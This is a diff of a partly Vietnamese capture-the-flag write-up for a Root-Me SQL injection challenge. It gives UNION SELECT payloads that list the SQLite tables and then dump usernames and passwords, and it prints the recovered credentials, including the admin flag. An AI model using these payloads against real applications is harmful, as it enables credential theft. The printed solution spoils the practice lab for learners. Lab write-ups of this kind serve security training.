@@ -4,6 +4,8 @@
 
 `Link: http://challenge01.root-me.org/web-serveur/ch19/`
 
+![](sc.png)
+
 ## Request:
 
 - Retrieve the administrator password
@@ -12,17 +14,39 @@
 
 ### Step 1:
 
+![](search.png)
+
 - `Vào phần search thử với payload: 'sss'`
   -> Ta thấy xuất hiện lỗi với SQLite
 
+![](search-result.png)
+
 ### Step 2: Xem tên các table:
 
-- Gõ từ khoá vào thanh search: ' union select 1,tbl_name from sqlite_master --
+- Gõ từ khoá vào thanh search: 
+
+```sql
+' union select 1,tbl_name from sqlite_master --
+```
 
 -> Ta thu được kết quả tên các table
 
+![](view-tables.png)
+
 ### Step 3: Trích xuất password:
 
-- Gõ từ khoá vào thanh search: ' union select username,password from users --
+- Gõ từ khoá vào thanh search: 
+
+```sql
+' union select username,password from users --
+```
+
+![](view-password.png)
 
 -> Key sẽ là password của admin
+
+```
+admin (c4K04dtIaJsuWdi)
+user1 (OK4dSoYE)
+user2 (8Wbhkzmd)
+```
